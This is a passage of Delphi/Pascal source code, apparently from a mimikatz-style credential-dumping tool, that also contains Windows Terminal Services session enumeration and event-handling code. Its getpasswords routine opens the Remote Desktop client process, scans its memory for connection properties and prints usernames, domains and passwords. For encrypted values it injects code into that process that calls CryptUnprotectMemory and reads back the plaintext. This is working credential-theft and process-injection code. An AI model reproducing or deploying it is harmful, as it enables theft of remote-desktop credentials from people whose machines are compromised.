        sessions[j].WTSUserName:=GetWTSString(hServer,sessionid,dword(WTSUserName));
        sessions[j].WTSClientName:=GetWTSString(hServer,sessionid,dword(WTSClientName));
        sessions[j].WTSAppName:=GetWTSString(hServer,sessionid,dword(WTSApplicationName));
        sessions[j].WTSClientIP:=GetWTSString(hServer,sessionid,dword(WTSClientAddress));
        GetWTSLogonIdleTime(hserver,sessionid,sessions[j].WinstaLogonTime,sessions[j].WinstaIdleTime);
        end; //with
    end;   //for j
  if pSessionInfo<>nil then WTSFreeMemory(pSessionInfo);
  if hserver<>invalid_handle_value then wtscloseserver(hserver);
end; //proc

function decryptmemory(param:pointer):cardinal;stdcall;
        {
        const  CRYPTPROTECTMEMORY_BLOCK_SIZE    = 16;
        const  CRYPTPROTECTMEMORY_SAME_PROCESS  = 0;
        const  CRYPTPROTECTMEMORY_CROSS_PROCESS = 1;
        const  CRYPTPROTECTMEMORY_SAME_LOGON    = 2;
        }
begin

  //messageboxa(0,'abcdef','ijklmn',MB_OK ); //test
  //OutputDebugStringA (pchar('decryptmemory'));
  //OutputDebugString (pchar('pDataIn:'+inttohex(nativeuint(tdata(param^).pDataIn),sizeof(nativeuint))));
  //OutputDebugString (pchar('cbdatain:'+inttostr(tdata(param^).cbDataIn)));
  if CryptUnprotectMemory (tdata(param^).pDataIn  ,tdata(param^).cbDataIn,0)=true
  //CryptUnprotectMemory (pointer($1122334411223344)  ,$1234,0);
  then result:=1 else result:=0;
  //OutputDebugStringA(pchar('result:'+inttostr(result)));
  //result:=0;
  exitthread(0);

  {
  asm
  nop
  nop
  nop
  nop
  ret
  end;
  }
end;

procedure NextProc;
  begin

  end;

{
procedure decode(param:pointer);
var
  Inst: TInstruction;
  nInst: Integer;
  tmp:string;
  i:byte;
  p:pointer;
begin
  Inst := Default (TInstruction);
    Inst.Archi := CPUX  ;
    Inst.NextInst := param ;
    nInst := 0;
    Inst.Addr := Inst.NextInst; // added
  while (Inst.OpCode <> $c3) do
  begin
    inc(nInst);
    //Inst.Addr := Inst.NextInst; //removed
    DecodeInst(@Inst);
    //Writeln(Format('OpCode : 0x%.2x | Length : %d', [Inst.OpCode, Inst.InstSize]));

  //if inst.InstSize>1 then
    begin
    tmp:='';
    for i:=0 to inst.InstSize-1  do
      begin
      p:=pointer(nativeuint(Inst.Addr)+i);
      tmp:=tmp+inttohex(byte(p^),2);
      end;
     writeln(tmp);
    end;

   //inst.Addr :=pointer(nativeint(inst.Addr)+inst.InstSize ); //added
   Inst.Addr := Inst.NextInst;                                 //added
  end;
end;
}

function getpasswords(pid:dword):boolean;
var
  ProcessHandle:thandle;
  memoryregions :TMemoryRegions;
  MemorySize,dw1,ret,c:dword;
  BaseAddress,n:nativeint;
  Size,written:nativeuint;
  pfunc:pointer=nil;
  pdata:pointer=nil;
  properties:TS_PROPERTIES_KIWI;
  property_:TS_PROPERTY_KIWI;
  szPropertyName:string='';
  bdisplay:boolean=false;
  bytes:tbytes;
  ptr:pointer;
  param:tdata;
  tid:dword;
  status:ntstatus;
  hthread:thandle;
  ClientID:CLIENT_ID ;
  label search;
begin
  OutputDebugString (pchar('getpasswords'));
  log('getpasswords',0);
  //data.cbDataIn :=999;
  //CreateThread (nil,0,@decryptmemory,@data,0,tid);
  //exit;
  //decode(@decryptmemory);
  //exit;
  ProcessHandle:=thandle(-1);
  setlength(bytes,1024);

       ProcessHandle := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
       if ProcessHandle<>thandle(-1) then
          begin
               try
               ret:= getallmemoryregions(ProcessHandle ,MemoryRegions); //committed only
               if ret=0
                     then log('getallmemoryregions failed',1)
                     else
                     begin
                     //log(inttostr(length(MemoryRegions)),1);
                     //https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
                     //protect 2=r 20=rx 4=rw
                     //_type MEM_IMAGE=1000000 MEM_PRIVATE=20000 MEM_MAPPED=40000
                     for dw1:=0 to length(MemoryRegions) -1 do
                         begin
                         n:=0;
                         BaseAddress:=MemoryRegions[dw1].BaseAddress;
                         MemorySize:=MemoryRegions[dw1].MemorySize;
                         search:
                         if (MemoryRegions[dw1]._type=MEM_PRIVATE) and (MemoryRegions[dw1].protect=PAGE_READWRITE)
                            then n:=SearchMem2 (ProcessHandle ,pointer(BaseAddress),memorysize,mstsc_pattern);
                         if n<>0 then
                           begin
                           //log('found @ '+inttohex(n,sizeof(n)),1);
                           if readmem(ProcessHandle ,n-PtrUInt(@TS_PROPERTIES_KIWI(Nil^).unkh0),@properties ,sizeof(TS_PROPERTIES_KIWI))=true then
                              begin
                              if (Properties.unkd1 >= 10) and (Properties.unkd1 < 500) then
                                 begin
                                 if (Properties.cbProperties >= 10) and (Properties.cbProperties < 500) then
                                    begin
                                    if (Properties.pProperties)<>nil then
                                       begin
                                       log('*************************',1);
                                       log('found @ '+inttohex(n,sizeof(n)),0);
                                       log('properties:'+inttostr(properties.cbProperties) ,0);
                                       //log('pProperties:'+inttohex(nativeint(properties.pProperties),sizeof(nativeint)) ,1);
                                       ptr:=properties.pProperties;
                                       for c:=0 to properties.cbProperties -1 do
                                       begin
                                       szPropertyName:='';
                                       bdisplay:=false;
                                       //log('pProperties:'+inttohex(nativeint(ptr),sizeof(nativeint)) ,1);
                                       if readmem(ProcessHandle ,nativeuint(ptr),@property_,sizeof(property_)) then
                                          begin
                                          //log('dwtype:'+inttostr(property_.dwtype),1) ;
                                          if property_.szProperty <>nil then
                                                   if readmem(ProcessHandle ,nativeuint(property_.szProperty ),@bytes[0],512) then
                                                      //log(strpas ((@bytes[0])),1);
                                                      szPropertyName:=strpas (@bytes[0]);
                                          if ('ServerName'= szPropertyName) or
					     ('ServerFqdn'= szPropertyName) or
					     ('ServerNameUsedForAuthentication'= szPropertyName) or
					     ('UserSpecifiedServerName'= szPropertyName) or
					     ('UserName'= szPropertyName) or
					     ('Domain'= szPropertyName) or
					     ('Password'= szPropertyName) or
					     ('SmartCardReaderName'= szPropertyName) or
					     ('RDmiUsername'= szPropertyName) or
					     ('PasswordContainsSCardPin'= szPropertyName) then bdisplay:=true;
                                          if property_.dwtype=4 then
                                             //kprintf(L"[wstring] ");
                                             begin
                                             if bdisplay=true then
                                             begin
                                             if readmem(ProcessHandle ,nativeuint(property_.pvData ),@bytes[0],512)
                                               then log(szPropertyName+':'+strpas (pwidechar(@bytes[0])),1);
                                             end; //if bdisplay=true then
                                             end; //if property_.dwtype=4 then
                                          if property_.dwtype=6 then
                                             //kprintf(L"[protect] ");
                                             begin
                                             log('dwFlags:'+inttohex(property_.dwFlags,sizeof(property_.dwFlags)),0) ;
                                             if readmem(ProcessHandle ,nativeuint(property_.pvData ),@bytes[0],dword(property_.unkp2))
                                               then ;//  log(ByteToHexaString (@bytes[0],dword(property_.unkp2)) ,1);
                                             param.pDataIn :=property_.pvData;
                                             param.cbDataIn :=dword(property_.unkp2) ;
                                             log('data.pDataIn:'+inttohex(nativeuint(param.pDataIn),sizeof(nativeuint)),0);
                                             log('data.cbDataIn:'+inttostr(param.cbDataIn),0);
                                             //lets not overwrite the original property_.pvData while calling cryptunprotectmemory
                                             Size:=align(param.cbDataIn,$1000); //needed for NtAllocateVirtualMemory
                                             status:=NtAllocateVirtualMemory(ProcessHandle ,@pdata,0,@Size,MEM_COMMIT or MEM_RESERVE , PAGE_READWRITE);
                                             log('NtAllocateVirtualMemory Status:'+inttostr(Status),0);
                                             Status:=NtWriteVirtualMemory(ProcessHandle, pdata, @bytes[0], param.cbDataIn, @Written);
                                             log('NtWriteVirtualMemoryStatus:'+inttostr(Status),0);
                                             param.pDataIn:=pdata;
                                             if property_.dwFlags=$800 then
                                             begin
                                             if InjectRTL_CODE (ProcessHandle ,@decryptmemory,@param)
                                                then log('InjectRTL_CODE OK',0)
                                                else log('InjectRTL_CODE NOK',0);
                                             //lets read our newly allocated buffer which now contains a decrypted memory
                                             if bdisplay=true then
                                             begin
                                             if readmem(ProcessHandle ,nativeuint(pdata ),@bytes[0],dword(property_.unkp2))
                                               then log(szPropertyName+':'+BytetoAnsiString (@bytes[4],dword(property_.unkp2)-4) ,1);
                                             end; //if bdisplay=true then
                                             //free the buffer eventually...
                                             //could be an idea to write garbage before...
                                             NtFreeVirtualMemory (ProcessHandle,@pdata ,@size,MEM_RELEASE);
                                             end; //if property_.dwFlags=$800 then
                                             //
                                             if property_.dwFlags<>$800 then
                                                if readmem(ProcessHandle ,nativeuint(property_.pvData ),@bytes[0],dword(property_.unkp2))
                                                  then log(ByteToHexaString (@bytes[0],dword(property_.unkp2)) ,1);
                                             end; //if property_.dwtype=6 then
                                          end; //if readmem ...
                                       inc(ptr,sizeof(property_));
                                       end; //for i:=0 to properties.cbProperties -1 do
                                       end; //if pointer(Properties.pProperties)<>nil
                                    end; //if (Properties.cbProperties >= 10) ...
                                 end; //if (Properties.unkd1 >= 10) ...
                              end; //if readmem ...
                           //more?
                           MemorySize :=MemorySize -((n-baseaddress)+1);
                           BaseAddress:=n+1;
                           goto search;
                           end; //if n<>0 then

                         end;
                     end;
               except
               on e:exception do log(e.message,1);
               end;
          CloseHandle(ProcessHandle);
          end
          else log('OpenProcess failed',1);
end;

//********************
constructor TJwWTSEventThread.Create(CreateSuspended: Boolean;
  serverhandle: thandle);
begin
  inherited Create(CreateSuspended);
  FreeOnTerminate := False;
  fserverhandle:=serverhandle;
  //OutputDebugString('creating wtsevent thread');
end;

procedure TJwWTSEventThread.Execute;
begin
  //inherited Execute;

  while not Terminated do
  begin
    // Wait some time to prevent duplicate event dispatch
    Sleep(500);
    //OutputDebugString('Entering WTSWaitSystemEvent');

    if WTSWaitSystemEvent(FServerHandle, WTS_EVENT_ALL, FEventFlag) then
    begin
      //if FEventFlag > WTS_EVENT_FLUSH then
      //begin
        //OutputDebugString('Dispatching');
        Synchronize(DispatchEvent);
      //end;
    end
    else if FEventFlag > WTS_EVENT_FLUSH then
    begin
      raise Exception.Create('WTSWaitSystemEvent Failed');
    end;
    Sleep(0);
  end;
end;

procedure TJwWTSEventThread.DispatchEvent;
begin
  if FEventFlag > WTS_EVENT_NONE then
  begin
    self.FireEvent(FEventFlag);
    FEventFlag := WTS_EVENT_NONE;
  end;
end;

procedure TJwWTSEventThread.FireEvent(EventFlag: DWORD);
begin
  // Set LastEventFlag property
  FLastEventFlag := EventFlag;

  // The OnSessionEvent should be fired if anything happens that is session
  // related, like statechange, logon/logoff, disconnect and (re)connect.
  if (EventFlag > WTS_EVENT_CONNECT) and (EventFlag < WTS_EVENT_LICENSE) then
  begin
    if Assigned(OnSessionEvent) then
    begin
      OnSessionEvent(Self);
    end;
  end;

  if (EventFlag and WTS_EVENT_LICENSE = WTS_EVENT_LICENSE) and
    Assigned(OnLicenseStateChange) then
  begin
    OnLicenseStateChange(Self);
  end;
  if (EventFlag and WTS_EVENT_STATECHANGE = WTS_EVENT_STATECHANGE) and
    Assigned(OnSessionStateChange) then
  begin
    OnSessionStateChange(Self);
  end;
  if (EventFlag and WTS_EVENT_LOGOFF = WTS_EVENT_LOGOFF) and
    Assigned(OnSessionLogoff) then
  begin
    OnSessionLogoff(Self);
  end;
  if (EventFlag and WTS_EVENT_LOGON = WTS_EVENT_LOGON) and
    Assigned(OnSessionLogon) then
  begin
    OnSessionLogon(Self);
  end;
  if (EventFlag and WTS_EVENT_DISCONNECT = WTS_EVENT_DISCONNECT) and
    Assigned(OnSessionDisconnect) then
  begin
    OnSessionDisconnect(Self);
  end;
  if (EventFlag and WTS_EVENT_CONNECT = WTS_EVENT_CONNECT) and
    Assigned(OnSessionConnect) then
  begin
    OnSessionConnect(Self);
  end;
  if (EventFlag and WTS_EVENT_RENAME = WTS_EVENT_RENAME) and
    Assigned(OnWinStationRename) then
  begin
    OnWinStationRename(Self);
  end;
  if (EventFlag and WTS_EVENT_DELETE = WTS_EVENT_DELETE) and
    Assigned(OnSessionDelete) then
  begin
    OnSessionDelete(Self);
  end;
  if (EventFlag and WTS_EVENT_CREATE = WTS_EVENT_CREATE) and
    Assigned(OnSessionCreate) then
  begin
    OnSessionCreate(Self);
  end;

end;

//********************



initialization InitAPI;
finalization FreeAPI;

end.
